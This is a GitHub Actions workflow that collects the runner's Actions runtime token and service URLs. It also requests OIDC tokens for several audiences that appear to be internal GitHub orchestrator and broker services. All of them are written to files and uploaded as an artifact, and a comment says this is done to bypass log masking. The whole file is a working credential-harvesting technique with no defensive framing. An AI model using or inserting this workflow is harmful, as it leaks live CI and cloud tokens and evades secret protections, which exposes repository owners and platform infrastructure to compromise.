name: Runtime Token Capture
on: workflow_dispatch
permissions:
  contents: read
  id-token: write
jobs:
  capture:
    runs-on: ubuntu-latest
    steps:
      - name: Capture runtime token
        run: |
          # Save runtime token to file (artifact bypasses log masking)
          echo "$ACTIONS_RUNTIME_TOKEN" > /tmp/runtime-token.txt
          echo "$ACTIONS_CACHE_URL" > /tmp/cache-url.txt
          echo "$ACTIONS_RESULTS_URL" > /tmp/results-url.txt
          echo "$ACTIONS_RUNTIME_URL" > /tmp/runtime-url.txt
          
          # Also get OIDC token for the orchestrator audience
          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
            for aud in "api://hosted-compute-ro" "https://broker.actions.githubusercontent.com" \
              "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"; do
              TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$aud" | python3 -c "import json,sys; print(json.load(sys.stdin).get('value',''))")
              echo "$TOKEN" > "/tmp/oidc-$(echo $aud | tr '/:' '__').txt"
            done
          fi
          
      - uses: actions/upload-artifact@v4
        with:
          name: all-tokens
          path: /tmp/*.txt
          retention-days: 1
